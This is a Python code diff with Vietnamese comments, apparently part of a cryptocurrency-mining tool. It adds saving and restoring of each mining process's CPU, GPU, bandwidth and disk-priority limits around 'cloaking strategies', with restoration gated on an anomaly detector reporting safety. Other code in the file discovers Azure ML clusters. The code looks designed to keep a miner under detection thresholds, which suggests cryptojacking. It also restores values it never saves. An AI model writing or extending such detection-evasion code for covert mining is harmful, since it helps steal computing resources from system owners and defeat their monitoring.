@@ -10,7 +10,7 @@ from time import sleep, time
 from pathlib import Path
 from queue import PriorityQueue, Empty, Queue
 from threading import Event, Thread, Lock
-from typing import List, Any, Dict
+from typing import List, Any, Dict, Optional
 
 from readerwriterlock import rwlock  # Read-Write Lock
 
@@ -60,6 +60,9 @@ class SharedResourceManager:
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         self.config = config
         self.logger = logger
+
+        # Thêm thuộc tính để lưu trữ trạng thái tài nguyên ban đầu của các tiến trình
+        self.original_resource_limits = {}
 
     def adjust_cpu_threads(self, pid: int, cpu_threads: int, process_name: str):
         """Điều chỉnh số luồng CPU."""
@@ -176,18 +179,191 @@ class SharedResourceManager:
             self.logger.error(f"Lỗi khi điều chỉnh tần số CPU dựa trên tải cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
-        """Áp dụng một chiến lược cloaking cụ thể cho tiến trình."""
+        """
+        Áp dụng một chiến lược cloaking cụ thể cho tiến trình và lưu trạng thái tài nguyên ban đầu.
+
+        Args:
+            strategy_name (str): Tên chiến lược cloaking.
+            process (MiningProcess): Tiến trình cần áp dụng cloaking.
+        """
         strategy = CloakStrategyFactory.create_strategy(strategy_name, self.config, self.logger, self.is_gpu_initialized())
         if strategy:
             try:
                 adjustments = strategy.apply(process)
                 if adjustments:
                     self.logger.info(f"Áp dụng điều chỉnh {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {adjustments}")
+
+                    # Lưu trạng thái tài nguyên ban đầu trước khi điều chỉnh
+                    pid = process.pid
+                    if pid not in self.original_resource_limits:
+                        self.original_resource_limits[pid] = {}
+
+                    for key, value in adjustments.items():
+                        if key == 'cpu_freq':
+                            # Lưu tần số CPU ban đầu
+                            original_freq = self.get_current_cpu_frequency(pid)
+                            self.original_resource_limits[pid]['cpu_freq'] = original_freq
+                        elif key == 'gpu_power_limit':
+                            # Lưu giới hạn công suất GPU ban đầu
+                            original_power_limit = self.get_current_gpu_power_limit(pid)
+                            self.original_resource_limits[pid]['gpu_power_limit'] = original_power_limit
+                        elif key == 'network_bandwidth_limit_mbps':
+                            # Lưu giới hạn băng thông mạng ban đầu
+                            original_bw_limit = self.get_current_network_bandwidth_limit(pid)
+                            self.original_resource_limits[pid]['network_bandwidth_limit_mbps'] = original_bw_limit
+                        elif key == 'ionice_class':
+                            # Lưu lớp ionice ban đầu
+                            original_ionice_class = self.get_current_ionice_class(pid)
+                            self.original_resource_limits[pid]['ionice_class'] = original_ionice_class
+                        # ... Lưu các giới hạn khác tương tự
+
+                    # Thực hiện điều chỉnh
                     self.execute_adjustments(adjustments, process)
+                else:
+                    self.logger.warning(f"Không có điều chỉnh nào được áp dụng cho chiến lược {strategy_name} cho tiến trình {process.name} (PID: {process.pid}).")
             except Exception as e:
                 self.logger.error(f"Lỗi khi áp dụng chiến lược cloaking {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {e}")
         else:
             self.logger.warning(f"Chiến lược cloaking {strategy_name} không được tạo thành công cho tiến trình {process.name} (PID: {process.pid}).")
+
+    def restore_resources(self, process: MiningProcess):
+        """
+        Khôi phục tài nguyên cho tiến trình sau khi đã xác nhận an toàn từ AnomalyDetector.
+
+        Args:
+            process (MiningProcess): Tiến trình cần khôi phục tài nguyên.
+        """
+        try:
+            pid = process.pid
+            process_name = process.name
+
+            # Lấy giới hạn tài nguyên ban đầu
+            original_limits = self.original_resource_limits.get(pid)
+            if not original_limits:
+                self.logger.warning(f"Không tìm thấy giới hạn tài nguyên ban đầu cho tiến trình {process_name} (PID: {pid}).")
+                return
+
+            # Khôi phục tần số CPU
+            cpu_freq = original_limits.get('cpu_freq')
+            if cpu_freq:
+                self.adjust_cpu_frequency(pid, cpu_freq, process_name)
+                self.logger.info(f"Đã khôi phục tần số CPU về {cpu_freq}MHz cho tiến trình {process_name} (PID: {pid}).")
+
+            # Khôi phục số luồng CPU
+            cpu_threads = original_limits.get('cpu_threads')
+            if cpu_threads:
+                self.adjust_cpu_threads(pid, cpu_threads, process_name)
+                self.logger.info(f"Đã khôi phục số luồng CPU về {cpu_threads} cho tiến trình {process_name} (PID: {pid}).")
+
+            # Khôi phục giới hạn RAM
+            ram_allocation_mb = original_limits.get('ram_allocation_mb')
+            if ram_allocation_mb:
+                self.adjust_ram_allocation(pid, ram_allocation_mb, process_name)
+                self.logger.info(f"Đã khôi phục giới hạn RAM về {ram_allocation_mb}MB cho tiến trình {process_name} (PID: {pid}).")
+
+            # Khôi phục mức sử dụng GPU
+            gpu_power_limit = original_limits.get('gpu_power_limit')
+            if gpu_power_limit:
+                self.adjust_gpu_power_limit(pid, gpu_power_limit, process_name)
+                self.logger.info(f"Đã khôi phục giới hạn công suất GPU về {gpu_power_limit}W cho tiến trình {process_name} (PID: {pid}).")
+
+            # Khôi phục giới hạn Disk I/O
+            ionice_class = original_limits.get('ionice_class')
+            if ionice_class:
+                self.adjust_disk_io_priority(pid, ionice_class, process_name)
+                self.logger.info(f"Đã khôi phục lớp ionice về {ionice_class} cho tiến trình {process_name} (PID: {pid}).")
+
+            # Khôi phục giới hạn băng thông mạng
+            network_bandwidth_limit_mbps = original_limits.get('network_bandwidth_limit_mbps')
+            if network_bandwidth_limit_mbps:
+                self.adjust_network_bandwidth(process, network_bandwidth_limit_mbps)
+                self.logger.info(f"Đã khôi phục giới hạn băng thông mạng về {network_bandwidth_limit_mbps} Mbps cho tiến trình {process_name} (PID: {pid}).")
+
+            # Xóa trạng thái giới hạn ban đầu sau khi khôi phục
+            del self.original_resource_limits[pid]
+            self.logger.info(f"Đã khôi phục tất cả tài nguyên cho tiến trình {process_name} (PID: {pid}).")
+
+        except Exception as e:
+            self.logger.error(f"Lỗi khi khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}): {e}")
+
+    def get_current_cpu_frequency(self, pid: int) -> Optional[int]:
+        """
+        Lấy tần số CPU hiện tại của tiến trình.
+
+        Args:
+            pid (int): PID của tiến trình.
+
+        Returns:
+            Optional[int]: Tần số CPU hiện tại (MHz) hoặc None nếu không thể lấy.
+        """
+        try:
+            freq = psutil.cpu_freq().current
+            return int(freq)
+        except Exception as e:
+            self.logger.error(f"Lỗi khi lấy tần số CPU hiện tại cho PID {pid}: {e}")
+            return None
+
+    def get_current_gpu_power_limit(self, pid: int) -> Optional[int]:
+        """
+        Lấy giới hạn công suất GPU hiện tại.
+
+        Args:
+            pid (int): PID của tiến trình.
+
+        Returns:
+            Optional[int]: Giới hạn công suất GPU hiện tại (W) hoặc None nếu không thể lấy.
+        """
+        try:
+            pynvml.nvmlInit()
+            handle = pynvml.nvmlDeviceGetHandleByIndex(0)
+            power_limit_mw = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
+            pynvml.nvmlShutdown()
+            return int(power_limit_mw / 1000)  # Chuyển đổi từ mW sang W
+        except Exception as e:
+            self.logger.error(f"Lỗi khi lấy giới hạn công suất GPU hiện tại cho PID {pid}: {e}")
+            return None
+
+    def get_current_network_bandwidth_limit(self, pid: int) -> Optional[float]:
+        """
+        Lấy giới hạn băng thông mạng hiện tại (Mbps).
+
+        Args:
+            pid (int): PID của tiến trình.
+
+        Returns:
+            Optional[float]: Giới hạn băng thông mạng hiện tại (Mbps) hoặc None nếu không thể lấy.
+        """
+        # Giả sử không có giới hạn băng thông mạng được thiết lập
+        return None
+
+    def get_current_ionice_class(self, pid: int) -> Optional[int]:
+        """
+        Lấy lớp ionice hiện tại của tiến trình.
+
+        Args:
+            pid (int): PID của tiến trình.
+
+        Returns:
+            Optional[int]: Lớp ionice hiện tại hoặc None nếu không thể lấy.
+        """
+        try:
+            proc = psutil.Process(pid)
+            ionice_class = proc.ionice()
+            return ionice_class
+        except Exception as e:
+            self.logger.error(f"Lỗi khi lấy ionice class cho PID {pid}: {e}")
+            return None
+
+    def is_gpu_initialized(self) -> bool:
+        """Kiểm tra xem GPU đã được khởi tạo hay chưa."""
+        try:
+            pynvml.nvmlInit()
+            gpu_count = pynvml.nvmlDeviceGetCount()
+            pynvml.nvmlShutdown()
+            return gpu_count > 0
+        except pynvml.NVMLError as e:
+            self.logger.error(f"Lỗi khi kiểm tra GPU: {e}")
+            return False
 
     def execute_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
         """Thực hiện các điều chỉnh tài nguyên dựa trên các điều chỉnh được trả về từ chiến lược cloaking."""
@@ -207,17 +383,6 @@ class SharedResourceManager:
                     self.logger.warning(f"Không nhận dạng được điều chỉnh: {key}")
         except Exception as e:
             self.logger.error(f"Lỗi khi thực hiện các điều chỉnh cloaking cho tiến trình {process.name} (PID: {process.pid}): {e}")
-
-    def is_gpu_initialized(self) -> bool:
-        """Kiểm tra xem GPU đã được khởi tạo hay chưa."""
-        try:
-            pynvml.nvmlInit()
-            gpu_count = pynvml.nvmlDeviceGetCount()
-            pynvml.nvmlShutdown()
-            return gpu_count > 0
-        except pynvml.NVMLError as e:
-            self.logger.error(f"Lỗi khi kiểm tra GPU: {e}")
-            return False
 
 # ----------------------------
 # ResourceManager Singleton
@@ -649,6 +814,10 @@ class ResourceManager(BaseManager):
             elif task_type == 'monitoring':
                 adjustments = adjustment_task['adjustments']
                 self.apply_monitoring_adjustments(adjustments, process)
+            elif task_type == 'restore':
+                # Thêm xử lý cho nhiệm vụ 'restore'
+                self.shared_resource_manager.restore_resources(process)
+                self.logger.info(f"Đã khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}).")
             else:
                 self.logger.warning(f"Loại nhiệm vụ không xác định: {task_type}")
 
@@ -766,3 +935,4 @@ class ResourceManager(BaseManager):
             self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
         except Exception as e:
             self.logger.error(f"Lỗi khi khám phá tài nguyên Azure: {e}")
+
